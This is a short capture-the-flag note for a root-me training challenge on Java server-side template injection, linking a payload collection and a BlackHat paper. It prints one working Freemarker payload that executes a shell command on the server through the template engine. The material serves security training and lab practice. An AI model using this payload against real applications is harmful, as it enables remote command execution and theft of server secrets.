# Java: Server-side Template Injection (SSTI)

[root-me challenge: Java - Server-side Template Injection](https://www.root-me.org/en/Challenges/Web-Server/Java-Server-side-Template-Injection): Exploit the vulnerability in order to retrieve the validation password in the file `SECRET_FLAG.txt`.

----

[PayLoadAllTheThings Freemarker code execution](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#freemarker---code-execution)

```text
${"freemarker.template.utility.Execute"?new()("ls -la")}
```

etcetera.

## Resources

* [Server-Side Template Injection RCE For The Modern Web App - BlackHat 15](https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Server-Side%20Template%20Injection%20RCE%20For%20The%20Modern%20Web%20App%20-%20BlackHat%2015.pdf)